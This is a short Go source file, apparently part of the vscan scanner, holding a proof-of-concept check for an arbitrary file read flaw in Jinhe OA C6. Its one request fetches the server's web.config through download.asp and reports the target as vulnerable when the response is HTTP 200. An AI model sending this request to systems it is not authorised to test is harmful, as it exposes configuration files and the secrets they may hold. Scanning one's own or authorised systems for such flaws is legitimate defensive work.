package jinheOA

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

//金和OA C6 download.jsp 任意文件读取漏洞

func C6download(u string) bool {
	if req, err := pkg.HttpRequset(u+"/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			pkg.GoPocLog(fmt.Sprintf("Found vuln 金和OA C6 download.jsp 任意文件读取漏洞 |%s\n", u+"/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"))
			return true
		}
	}
	return false
}
